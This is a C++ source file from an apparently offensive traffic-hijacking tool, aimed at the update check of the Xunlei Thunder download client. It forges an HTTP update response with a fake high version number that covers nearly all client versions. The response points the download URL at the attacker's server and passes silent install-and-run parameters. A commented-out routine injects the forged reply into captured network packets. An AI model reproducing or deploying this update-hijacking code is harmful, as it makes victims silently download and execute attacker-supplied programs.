
#include <windows.h>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "Thunder.h"
#include <iostream>
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../ssl/sslPublic.h"

using namespace std;




// GET /plugin?peerid=3FEC19B000009KPQ&os=10.0.0.0.1&pid=1&v=9.1.49.1060&cid=100001&lng=0804&tag= HTTP/1.1
// Host: upgrade.xl9.xunlei.com







Thunder::Thunder(DWORD ulIP, string filepath, string fn) {
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + G_USERNAME;

	string version = "99.9.99.436";	//10.1.14.436
	char *retformat =
		"{\"data\":{\"id\":\"31\",\"title\":\"XunLeiXUpdateManual\",\"pid\":1,"
		"\"cid\":\"100001,100002,100003,100004,100005,100006,100007,100008,100009,100010,100011,100012,100013,100014,100015,100017,100018,100019,"
		"100020,100021,100022,100023,100024,100025,100026,100027,100028,100029,100030,100031,100032,100033,100034,100035,100036,100037,100030,100038,100099\","
		"\"cover_version\":\"9.0.1-9.0.20,9.1.21-9.1.49,9.5.60-9.5.63,10.0.1-10.0.3,10.1.0-99.1.12\","
		"\"cover_os_version\":\"6.0-10.0\",\"v\":\"%s\",\"t\":2,"
		"\"desc\":\"update\","
		"\"status\":\"1\",\"url\":\"http://%s/%s\","
		"\"size\":%u,\"param\":\"/S /LiveUpdate /AutoRun\",\"md5\":\"%s\","
		"\"lng\":\"0804\",\"retrywait\":0,\"retrytimes\":0,\"name\":\"迅雷9正式版\"},\"content\":\"success\",\"code\":0}";

	string filename = Public::getUserPluginPath(G_USERNAME) + WEIXIN_PC_UPDATE_EXE_FILENAME;
	char szmd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	int exefs = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char result[4096] = { 0 };
	int retlen = sprintf(result, retformat, version.c_str(), ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, exefs, szmd5);

	int m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

	return;
}


/*
int Thunder::prepareRespData(DWORD ulIP,string filepath,string filename) {

	//string modulename = "DownloadSDKUpdate";
	string strver = "9.9.99.9999";		//9.5.63.2128
	int retrytimes = 3;
	int retrywait = 3;
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * jsFormat =

	"{\"data\":{\"id\":\"10\",\"title\":\"UpdateTo9563Manual\",\"pid\":1,"
	"\"cid\":\"100001,100002,100003,100004,100005,100006,100007,100008,100009,100010,100011,100012,100013,100014,100015,100017,100018\","
	"\"cover_version\":\"1.0.0-10.0.50.1080,1.5.60.2000-10.5.62.2100\",\"v\":\"%s\",\"t\":0,"
	"\"desc\":\"界面UI全面升级，更轻便更简洁；\n移除部分插件和广告位，更清爽；\n全新的任务详情页面，任务信息一目了然；\n新增“迅雷口令”功能；\","
	"\"status\":\"0\",\"url\":\"http://%s/%s\","
	"\"size\":%u,"
	"\"param\":\"/S /LiveUpdate /AutoRun\",\"md5\":\"%s\",\"lng\":\"0804\",\"retrywait\":%u,\"retrytimes\":%u,"
	"\"name\":\"迅雷9正式版\"},\"content\":\"success\",\"code\":0}";

// 	"{ \"data\":["
// 	"{\"name\":\"%s\",\"version\" : \"%s\",\"time\" : 0,\"status\" : 0,\"loadtype\" : 0,\"vipstate\" : 0,\"state\" : 0,"
// 	"\"url\" : \"http://%s/%s\","
// 	"\"md5\" : \"%s\",\"description\" : \"\",\"versionDetail\" : \"%s\","
// 	"\"cid\" : \",100001,100002,100003,100004,100005,100006,100007,100008,100009,100010,100011,100012,100013,100014,100015,100017,100018\","
// 	"\"id\" : 1,\"pid\" : 0}"
// 	"],\"content\" : \"\",\"tag\" : \"\",\"code\" : 0}";

	int ret = FALSE;

	char szip[MAX_PATH] = { 0 };
	unsigned char cip[4] = { 0 };
	memmove(cip, &ulIP, 4);
	ret = wsprintfA(szip, "%u.%u.%u.%u", cip[0], cip[1], cip[2], cip[3]);

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpJs[MAX_RESPONSE_HEADER_SIZE];
	int iJsLen = sprintf_s(lpJs, MAX_RESPONSE_HEADER_SIZE, jsFormat, strver.c_str(),
		szip, filename.c_str(), filesize,szmd5, retrywait,retrytimes);

	iRespSize = sprintf_s(lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsLen, lpJs);

	return iRespSize;
}*/



/*
int Thunder::sendRespData(pcap_t * pcap, unsigned char * lppacket, int packetsize,char * flag) {
	int ret = 0;
	if (*m_lpResp && m_iRespSize)
	{
		ret = ReplacePacket(pcap, (unsigned char*)lppacket, packetsize, m_lpResp, m_iRespSize, flag);
	}

	return ret;
}*/